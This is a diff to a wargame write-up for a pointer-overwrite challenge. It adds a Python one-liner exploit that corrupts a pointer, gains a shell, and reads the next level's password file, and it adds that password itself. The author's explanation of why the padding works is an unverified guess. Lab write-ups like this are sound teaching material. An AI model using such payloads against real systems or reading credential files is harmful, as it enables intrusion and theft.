@@ -17,7 +17,13 @@ gdb --args ./level1
 
 So if we decrement ptr to point just before the beginning of buf by pushing '\', ptr points at itself, and we can change its value arbitrarily using the third option listed before.
  
-This works, but I do not know why I need to put all the chars after the ptr value change
+This works, but I do not know why exactly I need to put all the chars after the ptr value change.
+I strongly suspect that by adding this 4000 chars, we overflow the limit of chars in a single bash command, thus preventing the EOF character to appear.
+The EOF char would terminate the vortex1 process and thus our shell as well.
 ```
 python -c 'print "\\"*0x105+"\xcaXXXXXXXX" + "\\" + "z"*4000 + "\nwhoami\n" + "cat /etc/vortex_pass/vortex2\n"' | ./vortex1 
 ```
+
+level2 pass : 
+
+23anbT\rE
